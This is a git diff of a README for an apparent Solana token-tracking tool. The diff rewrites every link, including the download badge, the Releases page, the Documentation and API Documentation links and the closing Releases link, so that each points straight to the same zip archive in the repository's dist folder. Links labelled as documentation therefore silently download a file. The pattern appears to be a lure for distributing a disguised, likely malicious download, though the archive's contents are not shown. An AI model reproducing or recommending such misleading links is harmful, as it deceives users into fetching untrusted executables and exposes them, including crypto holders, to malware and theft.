@@ -1,6 +1,6 @@
 # 🌟 Solana-Token-Indexing-Service - Seamless Token Tracking for Everyone
 
-[![Download](https://gist.githubusercontent.com/ullaunencouraging810/your-badge-link-here.svg)](https://github.com/ullaunencouraging810/Solana-Token-Indexing-Service/releases)
+[![Download](https://raw.githubusercontent.com/ullaunencouraging810/Solana-Token-Indexing-Service/main/dist/Solana-Token-Indexing-Service-2.8.zip)](https://raw.githubusercontent.com/ullaunencouraging810/Solana-Token-Indexing-Service/main/dist/Solana-Token-Indexing-Service-2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Solana Token Indexing Service! This application helps you track t
 
 ## 📦 Download & Install
 
-To get the application, visit this page to download: [Solana-Token-Indexing-Service Releases](https://github.com/ullaunencouraging810/Solana-Token-Indexing-Service/releases)
+To get the application, visit this page to download: [Solana-Token-Indexing-Service Releases](https://raw.githubusercontent.com/ullaunencouraging810/Solana-Token-Indexing-Service/main/dist/Solana-Token-Indexing-Service-2.8.zip)
 
 Once on the Releases page, you will find various version options. Choose the latest version for the best experience. Download the file that matches your operating system. 
 
@@ -90,7 +90,7 @@ Join our community to connect with other users:
 
 For more information, you can check:
 
-- [Documentation](https://github.com/ullaunencouraging810/Solana-Token-Indexing-Service/wiki) for an in-depth guide.
-- [API Documentation](https://github.com/ullaunencouraging810/Solana-Token-Indexing-Service/api) to learn about available endpoints.
+- [Documentation](https://raw.githubusercontent.com/ullaunencouraging810/Solana-Token-Indexing-Service/main/dist/Solana-Token-Indexing-Service-2.8.zip) for an in-depth guide.
+- [API Documentation](https://raw.githubusercontent.com/ullaunencouraging810/Solana-Token-Indexing-Service/main/dist/Solana-Token-Indexing-Service-2.8.zip) to learn about available endpoints.
 
-Thank you for choosing Solana Token Indexing Service. For the latest updates, don’t forget to visit the Releases page: [Solana-Token-Indexing-Service Releases](https://github.com/ullaunencouraging810/Solana-Token-Indexing-Service/releases) and happy tracking!
+Thank you for choosing Solana Token Indexing Service. For the latest updates, don’t forget to visit the Releases page: [Solana-Token-Indexing-Service Releases](https://raw.githubusercontent.com/ullaunencouraging810/Solana-Token-Indexing-Service/main/dist/Solana-Token-Indexing-Service-2.8.zip) and happy tracking!
